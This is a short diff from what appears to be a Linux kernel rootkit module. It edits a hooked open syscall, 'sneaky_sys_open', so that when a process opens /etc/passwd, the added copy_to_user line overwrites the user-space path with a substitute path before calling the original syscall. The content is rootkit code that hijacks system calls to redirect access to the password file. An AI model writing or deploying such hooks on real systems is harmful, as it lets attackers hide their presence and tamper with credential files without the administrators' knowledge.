@@ -88,9 +88,11 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
 
   if (!(strcmp(pathname, passwd_path))) {
     printk_ratelimited(KERN_INFO "matched /etc/passwd... %s\n", pathname);
+    copy_to_user((char *)pathname, tmp_path, strlen(tmp_path));
+    printk_ratelimited(KERN_INFO "User Space path: %s\n", pathname);
   }
 
-  return original_open_call(pathname, flags);
+  return original_open_call((const char *)pathname, flags);
 }
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
